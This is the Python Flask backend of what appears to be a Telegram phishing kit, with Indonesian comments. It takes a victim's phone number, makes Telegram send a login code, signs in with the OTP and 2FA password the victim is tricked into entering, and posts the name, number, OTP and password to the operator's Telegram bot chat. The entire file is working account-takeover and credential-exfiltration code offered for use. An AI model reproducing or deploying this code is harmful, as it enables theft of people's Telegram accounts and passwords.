import os
import requests
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan data sesi dan hash sementara
user_sessions = {}

def send_to_bot_with_button(nama, nomor, otp="None", sandi="None"):
    """Mengirim log ke bot dengan tampilan sesuai gambar"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"Nama: *{nama}*\nNomor: `{nomor}`\nKata sandi: *{sandi}*\nOTP : `{otp}`",
        "parse_mode": "Markdown",
        "reply_markup": {
            "inline_keyboard": [[{"text": "otp", "callback_data": f"get_otp_{nomor}"}]]
        }
    }
    requests.post(url, json=payload)

async def telegram_logic(data):
    step = data.get('step')
    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
    nama = data.get('nama', 'User')
    otp = data.get('otp', '')
    sandi = data.get('sandi', '')

    session_str = user_sessions.get(f"{nomor}_str", "")
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            # Pemicu pengiriman kode dari Telegram ke target
            result = await client.send_code_request(nomor)
            user_sessions[nomor] = {"hash": result.phone_code_hash, "nama": nama}
            user_sessions[f"{nomor}_str"] = client.session.save()
            send_to_bot_with_button(nama, nomor)
            return {"status": "success"}, 200
            
        elif step == 2:
            # Verifikasi OTP yang dimasukkan target
            try:
                session_data = user_sessions.get(nomor)
                await client.sign_in(nomor, otp, phone_code_hash=session_data['hash'])
                send_to_bot_with_button(nama, nomor, otp=otp)
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "invalid_otp", "message": "OTP SALAH!!"}, 400
                
        elif step == 3:
            # Penanganan 2FA
            await client.sign_in(password=sandi)
            send_to_bot_with_button(nama, nomor, otp="Verified", sandi=sandi)
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST'])
def register():
    result, status_code = async_to_sync(telegram_logic)(request.json)
    return jsonify(result), status_code

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))